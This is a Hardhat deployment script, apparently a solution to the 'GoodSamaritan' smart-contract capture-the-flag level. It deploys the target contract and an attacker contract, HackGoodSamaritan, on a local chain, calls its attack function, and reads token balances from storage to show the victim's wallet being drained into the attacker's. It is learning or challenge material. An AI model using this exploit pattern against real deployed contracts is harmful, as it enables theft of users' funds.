const hre = require('hardhat')

const hexToDecimal = (hex) => parseInt(hex, 16)

async function main() {
  const GoodSamaritan = await hre.ethers.getContractFactory('GoodSamaritan')
  const goodSamaritan = await GoodSamaritan.deploy()
  await goodSamaritan.deployed()
  console.log(`GoodSamaritan deployed to ${goodSamaritan.address}`)

  const HackGoodSamaritan = await hre.ethers.getContractFactory(
    'HackGoodSamaritan',
  )
  const hackGoodSamaritan = await HackGoodSamaritan.deploy()
  await hackGoodSamaritan.deployed()
  console.log(`HackGoodSamaritan deployed to ${hackGoodSamaritan.address}`)

  const from = goodSamaritan.address
  let nonce = 1
  const addrWallet = await ethers.utils.getContractAddress({ from, nonce })
  nonce++
  const addrCoin = await ethers.utils.getContractAddress({ from, nonce })

  const posSamaritan = ethers.utils.solidityKeccak256(
    ['uint256', 'uint256'],
    [addrWallet, 0],
  )
  const posHacker = ethers.utils.solidityKeccak256(
    ['uint256', 'uint256'],
    [hackGoodSamaritan.address, 0],
  )

  console.log(
    'Balace Good Samaritan wallet =',
    hexToDecimal(await ethers.provider.getStorageAt(addrCoin, posSamaritan)),
  )

  const attack = await hackGoodSamaritan.attack(goodSamaritan.address)
  await attack.wait()

  console.log(
    'Balace Good Samaritan wallet =',
    hexToDecimal(await ethers.provider.getStorageAt(addrCoin, posSamaritan)),
  )

  console.log(
    'Balace hacker =',
    hexToDecimal(await ethers.provider.getStorageAt(addrCoin, posHacker)),
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
